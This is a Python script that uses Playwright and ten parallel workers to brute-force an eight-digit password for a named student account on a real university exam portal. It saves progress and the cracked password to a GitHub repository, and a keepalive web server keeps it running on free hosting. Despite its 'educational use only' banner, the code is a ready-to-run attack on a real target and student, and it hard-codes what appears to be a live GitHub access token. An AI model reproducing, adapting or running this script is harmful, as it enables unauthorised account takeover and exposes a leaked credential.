"""
=============================================================
  BRUTE FORCE + GITHUB CHECKPOINT
  EDUCATIONAL USE ONLY
=============================================================
"""

import json
import os
import time
import sys
import base64
import threading
import requests as req_lib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── Config ────────────────────────────────────────────────────
TARGET_URL        = os.environ.get("TARGET_URL", "https://makaut1.ucanapply.com/smartexam/public/")
USERNAME          = os.environ.get("USERNAME",   "11900122027")
GITHUB_TOKEN      = os.environ.get("GITHUB_TOKEN", "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")
GITHUB_REPO       = os.environ.get("GITHUB_REPO", "abcdstore24-oss/My_Repo")
GITHUB_FILE       = "checkpoint.json"
NUM_WORKERS       = 10
DELAY             = 0.3
HEADLESS          = True
TOTAL_PINS        = 100_000_000
PIN_DIGITS        = len(str(TOTAL_PINS - 1))   # auto: 8
SAVE_EVERY        = 50
SUCCESS_BY_URL    = False
SUCCESS_BY_KEYWORD = True
SUCCESS_KEYWORD   = os.environ.get("SUCCESS_KEYWORD", "logout")

# ── Selectors ─────────────────────────────────────────────────
OPEN_MODAL_SELECTOR = "a[onclick*='openLoginPage(5)']"
USERNAME_SELECTOR   = "div.bootbox #username"
PASSWORD_SELECTOR   = "div.bootbox #password"

# ── Shared state ──────────────────────────────────────────────
found_event  = threading.Event()
found_result = {}
print_lock   = threading.Lock()


# ── PIN formatter ─────────────────────────────────────────────
def fmt(n: int) -> str:
    return str(n).zfill(PIN_DIGITS)


# ── Chunk splitter (remainder-safe) ───────────────────────────
def split_chunks(total: int, n: int):
    size   = total // n
    rem    = total % n
    chunks = []
    start  = 0
    for i in range(n):
        end = start + size + (1 if i < rem else 0)
        chunks.append((start, end))
        start = end
    return chunks


# ── Fake web server (keeps Render free tier awake) ────────────
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        status = "FOUND: " + found_result["pin"] if "pin" in found_result else "running"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(status.encode())

    def log_message(self, *args):
        pass

def start_web_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()


# ── GitHub helpers ────────────────────────────────────────────
def gh_headers():
    return {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept":        "application/vnd.github.v3+json",
    }

def github_load_all_checkpoints():
    """
    Load per-worker checkpoints from GitHub.
    Returns dict: { worker_id(int): last_pin_int } and the file sha.
    """
    if not GITHUB_TOKEN:
        return {}, None
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
        r   = req_lib.get(url, headers=gh_headers(), timeout=10)
        if r.status_code == 200:
            data    = r.json()
            content = json.loads(base64.b64decode(data["content"]).decode())
            sha     = data["sha"]
            workers = content.get("workers", {})
            # keys stored as strings in JSON, convert to int
            result  = {int(k): int(v) for k, v in workers.items()}
            print(f"  [GitHub] Checkpoint loaded: {result}")
            return result, sha
        elif r.status_code == 404:
            print("  [GitHub] No checkpoint yet — starting fresh.")
        else:
            print(f"  [GitHub] Load failed: {r.status_code}")
    except Exception as e:
        print(f"  [GitHub] Load error: {e}")
    return {}, None

# Global checkpoint store (loaded once in run(), shared across workers)
_gh_checkpoints: dict = {}
_gh_sha_lock = threading.Lock()
_gh_sha: str | None  = None

def github_save_checkpoint(worker_id: int, pin_int: int):
    global _gh_sha, _gh_checkpoints
    if not GITHUB_TOKEN:
        return
    with _gh_sha_lock:
        _gh_checkpoints[worker_id] = pin_int
        try:
            content = base64.b64encode(json.dumps({
                "workers":   {str(k): v for k, v in _gh_checkpoints.items()},
                "timestamp": datetime.now().isoformat(),
                "target":    TARGET_URL,
            }).encode()).decode()
            payload = {"message": f"checkpoint w{worker_id}={fmt(pin_int)}", "content": content}
            if _gh_sha:
                payload["sha"] = _gh_sha
            url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
            r   = req_lib.put(url, headers=gh_headers(), json=payload, timeout=10)
            if r.status_code in (200, 201):
                _gh_sha = r.json()["content"]["sha"]
            else:
                print(f"\n  [GitHub] Save failed: {r.status_code}")
        except Exception as e:
            print(f"\n  [GitHub] Save error: {e}")

def github_save_result(pin: str):
    if not GITHUB_TOKEN:
        return
    try:
        content = base64.b64encode(json.dumps({
            "FOUND":     True,
            "username":  USERNAME,
            "password":  pin,
            "timestamp": datetime.now().isoformat(),
            "target":    TARGET_URL,
        }, indent=2).encode()).decode()
        url   = f"https://api.github.com/repos/{GITHUB_REPO}/contents/result.json"
        check = req_lib.get(url, headers=gh_headers(), timeout=10)
        body  = {"message": f"FOUND PIN = {pin}", "content": content}
        if check.status_code == 200:
            body["sha"] = check.json()["sha"]
        req_lib.put(url, headers=gh_headers(), json=body, timeout=10)
        print("\n  [GitHub] result.json saved ✓")
    except Exception as e:
        print(f"\n  [GitHub] Result error: {e}")


# ── Success check ─────────────────────────────────────────────
def check_success(page) -> bool:
    try:
        if SUCCESS_BY_URL and "login" not in page.url:
            return True
        if SUCCESS_BY_KEYWORD:
            if SUCCESS_KEYWORD.lower() in page.inner_text("body").lower():
                return True
    except Exception:
        pass
    return False


# ── Browser alive ─────────────────────────────────────────────
def is_browser_alive(page) -> bool:
    try:
        _ = page.url
        return True
    except Exception:
        return False


# ── Modal open ────────────────────────────────────────────────
def open_modal(page, worker_id: int) -> bool:
    try:
        if TARGET_URL.rstrip("/") not in page.url:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
            page.wait_for_timeout(600)
        try:
            cancel = page.query_selector("div.bootbox.modal.in button[data-dismiss='modal']")
            if cancel and cancel.is_visible():
                cancel.click()
                page.wait_for_selector("div.bootbox.modal.in", state="hidden", timeout=3_000)
                page.wait_for_timeout(300)
        except Exception:
            pass
        page.wait_for_selector(OPEN_MODAL_SELECTOR, state="visible", timeout=5_000)
        page.click(OPEN_MODAL_SELECTOR)
        page.wait_for_selector("div.bootbox.modal.in", state="visible", timeout=6_000)
        page.wait_for_timeout(250)
        return True
    except PlaywrightTimeout:
        with print_lock:
            print(f"\n  [W{worker_id}] Timeout opening modal.")
        return False
    except Exception as e:
        with print_lock:
            print(f"\n  [W{worker_id}] Modal error: {e}")
        return False


# ── Worker ────────────────────────────────────────────────────
def worker(worker_id: int, chunk_start: int, chunk_end: int):
    # Each worker resumes from its OWN saved checkpoint, not a global one
    saved      = _gh_checkpoints.get(worker_id)
    start_from = (saved + 1) if saved is not None else chunk_start

    if start_from >= chunk_end:
        with print_lock:
            print(f"  [W{worker_id}] Already completed {fmt(chunk_start)}–{fmt(chunk_end-1)}, skipping.")
        return None

    with print_lock:
        print(f"  [W{worker_id}] Range {fmt(chunk_start)}–{fmt(chunk_end-1)} | "
              f"Resuming from {fmt(start_from)}")

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=HEADLESS, slow_mo=0)
        page    = browser.new_page()
        try:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
        except Exception as e:
            with print_lock:
                print(f"\n  [W{worker_id}] Page load error: {e}")
            browser.close()
            return None

        attempts   = 0
        last_pin   = start_from
        chunk_size = chunk_end - chunk_start

        try:
            for pin_int in range(start_from, chunk_end):
                if found_event.is_set():
                    break
                if not is_browser_alive(page):
                    with print_lock:
                        print(f"\n  [W{worker_id}] Browser closed, stopping.")
                    break

                pin      = fmt(pin_int)
                attempts += 1
                last_pin  = pin_int

                if attempts % SAVE_EVERY == 0:
                    github_save_checkpoint(worker_id, pin_int)

                progress = pin_int - chunk_start + 1
                pct      = progress / chunk_size * 100

                with print_lock:
                    print(
                        f"  [W{worker_id}] PIN {pin}  "
                        f"({progress}/{chunk_size}  {pct:.2f}%)",
                        end="\r"
                    )

                try:
                    if not open_modal(page, worker_id):
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                        if not open_modal(page, worker_id):
                            continue

                    page.fill(USERNAME_SELECTOR, "")
                    page.fill(USERNAME_SELECTOR, USERNAME)
                    page.fill(PASSWORD_SELECTOR, "")
                    page.fill(PASSWORD_SELECTOR, pin)
                    page.evaluate("postLogin()")
                    page.wait_for_timeout(1_500)

                    if check_success(page):
                        found_event.set()
                        found_result["pin"]       = pin
                        found_result["worker_id"] = worker_id
                        github_save_checkpoint(worker_id, pin_int)
                        github_save_result(pin)
                        with print_lock:
                            print(f"\n\n  [W{worker_id}] ✓ FOUND! PIN = {pin}")
                        browser.close()
                        return pin

                except PlaywrightTimeout:
                    if not is_browser_alive(page):
                        break
                    try:
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                    except Exception:
                        break
                    continue
                except Exception as e:
                    if not is_browser_alive(page):
                        break
                    with print_lock:
                        print(f"\n  [W{worker_id}] Error ({pin}): {e}")
                    continue

                if DELAY > 0:
                    time.sleep(DELAY)

        except KeyboardInterrupt:
            github_save_checkpoint(worker_id, last_pin)
            with print_lock:
                print(f"\n  [W{worker_id}] Saved at {fmt(last_pin)}")

        finally:
            try:
                browser.close()
            except Exception:
                pass

    return None


# ── Main ──────────────────────────────────────────────────────
def run():
    global _gh_checkpoints, _gh_sha

    print()
    print("=" * 62)
    print("  BRUTE FORCE — GitHub Checkpoint  (Educational Demo)")
    print("=" * 62)
    print(f"  Target   : {TARGET_URL}")
    print(f"  Username : {USERNAME}")
    print(f"  Workers  : {NUM_WORKERS}")
    print(f"  PIN range: {fmt(0)} – {fmt(TOTAL_PINS - 1)}")
    print(f"  Digits   : {PIN_DIGITS}")
    print(f"  Headless : {HEADLESS}")
    print(f"  Started  : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 62)

    # Load all per-worker checkpoints once at startup
    _gh_checkpoints, _gh_sha = github_load_all_checkpoints()

    # Start keepalive server
    threading.Thread(target=start_web_server, daemon=True).start()
    print("  [Web] Keepalive server started")

    chunks = split_chunks(TOTAL_PINS, NUM_WORKERS)
    print("\n  Chunk assignments:")
    for i, (s, e) in enumerate(chunks, 1):
        saved = _gh_checkpoints.get(i)
        note  = f"  ← resume from {fmt(saved + 1)}" if saved is not None else ""
        print(f"    Worker {i}: {fmt(s)} – {fmt(e-1)}  ({e-s:,} PINs){note}")
    print()

    start_ts = time.time()
    try:
        with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
            futures = {
                executor.submit(worker, i + 1, chunks[i][0], chunks[i][1]): i + 1
                for i in range(NUM_WORKERS)
            }
            for future in as_completed(futures):
                future.result()
    except KeyboardInterrupt:
        found_event.set()
        time.sleep(1)
        sys.exit(0)

    elapsed = time.time() - start_ts
    if "pin" in found_result:
        print(f"\n{'='*62}")
        print(f"  PASSWORD FOUND!")
        print(f"  Username : {USERNAME}")
        print(f"  Password : {found_result['pin']}")
        print(f"  Time     : {elapsed:.1f}s")
        print(f"{'='*62}\n")
    else:
        print(f"\n  Not found. Checkpoint saved — redeploy to continue.")
    print(f"  Total time : {elapsed:.1f}s\n")

if __name__ == "__main__":
    run()
